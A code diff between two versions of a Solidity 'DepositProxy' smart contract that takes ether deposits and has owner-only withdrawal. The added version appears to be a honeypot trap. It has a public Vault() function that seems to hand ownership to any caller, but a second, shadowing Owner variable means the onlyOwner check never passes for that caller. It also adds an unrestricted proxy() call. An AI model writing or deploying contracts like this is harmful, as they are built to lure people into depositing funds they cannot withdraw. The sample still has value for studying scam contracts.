@@ -1,44 +1,38 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract DepositProxy at 0x33f82dfbaafb07c16e06f9f81187f78efa9d438c
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract DepositProxy at 0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77
 */
-pragma solidity ^0.4.20;
+pragma solidity ^0.4.24;
 
 contract Proxy  {
-    address public Owner = msg.sender;
-    address public Proxy = 0x0;
-    bytes data;
-    modifier onlyOwner { if (msg.sender == Owner) _; }
-    function transferOwner(address _owner) public onlyOwner { Owner = _owner; }
-    function proxy(address _proxy) onlyOwner { Proxy = _proxy; }
-    function () payable { data = msg.data; }
-    function execute() returns (bool) { return Proxy.call(data); }
+    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
+    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
+    function proxy(address target, bytes data) public payable {
+        target.call.value(msg.value)(data);
+    }
 }
 
 contract DepositProxy is Proxy {
     address public Owner;
-    mapping (address => uint) public Deposits;
+    mapping (address => uint256) public Deposits;
 
-    event Deposited(address who, uint amount);
-    event Withdrawn(address who, uint amount);
+    function () public payable { }
     
-    function Deposit() payable {
+    function Vault() public payable {
         if (msg.sender == tx.origin) {
             Owner = msg.sender;
             deposit();
         }
     }
-
-    function deposit() payable {
-        if (msg.value >= 1 ether) {
+    
+    function deposit() public payable {
+        if (msg.value > 0.5 ether) {
             Deposits[msg.sender] += msg.value;
-            Deposited(msg.sender, msg.value);
         }
     }
     
-    function withdraw(uint amount) payable onlyOwner {
-        if (Deposits[msg.sender]>=amount) {
+    function withdraw(uint256 amount) public onlyOwner {
+        if (amount>0 && Deposits[msg.sender]>=amount) {
             msg.sender.transfer(amount);
-            Withdrawn(msg.sender, amount);
         }
     }
 }
